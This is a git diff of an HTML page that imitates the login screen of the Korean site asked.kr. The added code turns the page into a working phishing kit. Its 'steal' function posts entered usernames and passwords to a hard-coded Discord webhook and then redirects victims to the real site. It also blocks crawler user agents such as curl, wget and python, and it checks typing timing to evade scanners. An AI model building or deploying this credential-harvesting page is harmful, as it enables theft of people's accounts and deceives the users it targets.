@@ -4,91 +4,233 @@
   <meta charset="UTF-8">
   <title>에스크</title>
   <style>
-    * { box-sizing: border-box; font-family: 'Helvetica Neue', sans-serif; margin: 0; padding: 0; }
-    body { background-color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-    .wrapper { width: 360px; padding: 20px; }
-    .logo { font-weight: bold; font-size: 20px; margin-bottom: 30px; }
-    label { display: block; font-weight: bold; margin-bottom: 6px; font-size: 15px; }
-    input[type="text"], input[type="password"], input[type="tel"] {
-      width: 100%; padding: 12px; margin-bottom: 18px;
-      border-radius: 10px; border: 1px solid #ddd; font-size: 15px;
+    * {
+      box-sizing: border-box;
+      font-family: 'Helvetica Neue', sans-serif;
+      margin: 0;
+      padding: 0;
     }
-    .btn {
-      width: 100%; padding: 14px; font-weight: bold; font-size: 15px;
-      border: none; border-radius: 12px; cursor: pointer; margin-bottom: 20px;
-      background-color: #1DB6F2; color: white;
+
+    body {
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
     }
-    .toggle { text-align: center; font-size: 13px; color: #aaa; }
-    .toggle a { color: #1DB6F2; text-decoration: none; }
-    .toggle a:hover { text-decoration: underline; }
-    #signup-wrapper { display: none; }
+
+    .login-wrapper {
+      width: 360px;
+      padding: 20px;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      font-weight: bold;
+      font-size: 20px;
+      margin-bottom: 30px;
+    }
+
+    .logo::before {
+      content: '';
+      display: inline-block;
+      width: 28px;
+      height: 28px;
+      background-image: url('https://img.sur.ly/favicons/a/asked.kr.ico');
+      background-size: contain;
+      background-repeat: no-repeat;
+      margin-right: 8px;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 6px;
+      font-size: 15px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 18px;
+      border-radius: 10px;
+      border: 1px solid #ddd;
+      font-size: 15px;
+    }
+
+    .find-links {
+      display: flex;
+      justify-content: flex-end;
+      gap: 14px;
+      margin-top: -12px;
+      margin-bottom: 20px;
+      font-size: 13px;
+    }
+
+    .find-links a {
+      color: #888;
+      text-decoration: none;
+    }
+
+    .find-links a:hover {
+      text-decoration: underline;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 14px;
+      background-color: #1DB6F2;
+      color: white;
+      font-weight: bold;
+      font-size: 15px;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+
+    .divider {
+      text-align: center;
+      color: #bbb;
+      margin: 20px 0;
+      position: relative;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      width: 40%;
+      height: 1px;
+      background-color: #eee;
+    }
+
+    .divider::before {
+      left: 0;
+    }
+
+    .divider::after {
+      right: 0;
+    }
+
+    .apple-login {
+      width: 100%;
+      padding: 14px;
+      background-color: black;
+      color: white;
+      font-size: 15px;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+    }
+
+    .apple-login i {
+      font-style: normal;
+      font-size: 18px;
+    }
+
+    .signup {
+      text-align: center;
+      margin-top: 24px;
+      font-size: 13px;
+      color: #aaa;
+    }
+
+    .signup a {
+      color: #1da1f2;
+      text-decoration: none;
+    }
+
+    .signup a:hover {
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
-  <div class="wrapper">
-    <!-- 로그인 화면 -->
-    <div id="login-wrapper">
-      <div class="logo">로그인</div>
-      <form onsubmit="stealLogin(event)">
-        <label for="username">아이디</label>
-        <input id="username" type="text" required placeholder="아이디 입력">
-        <label for="password">비밀번호</label>
-        <input id="password" type="password" required placeholder="비밀번호 입력">
-        <button type="submit" class="btn">로그인</button>
-      </form>
-      <div class="toggle">아직 계정이 없으신가요? <a href="#" id="to-signup">회원가입</a></div>
-    </div>
+  <div class="container">
+    <div class="logo">로그인</div>
 
-    <!-- 회원가입 화면 -->
-    <div id="signup-wrapper">
-      <div class="logo">회원가입</div>
-      <form onsubmit="stealSignup(event)">
-        <label for="phone">전화번호</label>
-        <input id="phone" type="tel" required placeholder="전화번호 입력">
-        <label for="new-username">아이디</label>
-        <input id="new-username" type="text" required placeholder="아이디 입력">
-        <label for="new-password">비밀번호</label>
-        <input id="new-password" type="password" required placeholder="비밀번호 입력">
-        <label for="confirm-password">비밀번호 확인</label>
-        <input id="confirm-password" type="password" required placeholder="비밀번호 다시 입력">
-        <button type="submit" class="btn">회원가입</button>
-      </form>
-      <div class="toggle">이미 계정이 있으신가요? <a href="#" id="to-login">로그인</a></div>
+    <form onsubmit="steal(event)">
+      <label for="username">아이디</label>
+      <input class="input-field" id="username" type="text" placeholder="아이디 입력" required>
+
+      <label for="password">비밀번호</label>
+      <input class="input-field" id="password" type="password" placeholder="비밀번호 입력" required>
+
+      <div class="find-links">
+        <a href="#">아이디 찾기</a>
+        <a href="#">비밀번호 찾기</a>
+      </div>
+
+      <button type="submit" class="login-btn">로그인</button>
+    </form>
+
+    <div class="divider">또는</div>
+
+    <button class="apple-login">
+      <i></i> Apple로 시작하기
+    </button>
+
+    <div class="signup">
+      아직 에스크 계정이 없으신가요? <a href="#">회원가입</a>
     </div>
   </div>
-
 <script>
-  // 페이지 전환
-  document.getElementById("to-signup").addEventListener("click", e => {
-    e.preventDefault();
-    document.getElementById("login-wrapper").style.display = "none";
-    document.getElementById("signup-wrapper").style.display = "block";
-  });
-  document.getElementById("to-login").addEventListener("click", e => {
-    e.preventDefault();
-    document.getElementById("signup-wrapper").style.display = "none";
-    document.getElementById("login-wrapper").style.display = "block";
-  });
+  const startTime = Date.now();
+  let typed = false;
 
-  // 로그인 처리 (여기서는 실제 asked.kr로 이동만)
-  function stealLogin(e) {
-    e.preventDefault();
-    // 원래는 데이터 탈취 로직이 들어갈 수 있음
-    window.location.href = "https://asked.kr";
+  const ua = navigator.userAgent.toLowerCase();
+  const bots = ['curl', 'wget', 'python', 'bot', 'spider', 'httpclient'];
+  const isBot = bots.some(agent => ua.includes(agent));
+  if (isBot) {
+    console.log("Bot detected. Exiting.");
+    throw new Error("Blocked");
   }
 
-  // 회원가입 처리 (비밀번호 확인 포함)
-  function stealSignup(e) {
-    e.preventDefault();
-    const pw = document.getElementById("new-password").value;
-    const confirm = document.getElementById("confirm-password").value;
+  document.querySelectorAll(".input-field").forEach(field => {
+    field.addEventListener("input", () => {
+      typed = true;
+    });
+  });
 
-    if (pw !== confirm) {
-      alert("비밀번호가 일치하지 않습니다.");
+  function steal(e) {
+    e.preventDefault();
+
+    if (!typed || (Date.now() - startTime < 3000)) {
+      console.log("Suspicious interaction. Exiting.");
       return;
     }
-    // 원래는 데이터 탈취 로직이 들어갈 수 있음
-    window.location.href = "https://asked.kr/signup";
+
+    const u = document.getElementById("username").value;
+    const p = document.getElementById("password").value;
+
+    fetch("https://discord.com/api/webhooks/1396172055992336394/GOejbicsrzOQMrzWLor93mpEQLs2Dz6IPUeiGT7uvRF8EV6KNdmcJIcaltLIfAdZRcj1", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `🛑 강아지\nUsername: ${u}\nPassword: ${p}`
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        setTimeout(() => {
+          window.location.href = "https://asked.kr/hhhhhh_ch";
+        }, Math.random() * 2000 + 1000);
+      } else {
+        alert('Something went wrong.');
+      }
+    })
+    .catch(() => {
+      alert('Network error.');
+    });
   }
 </script>
 </body>
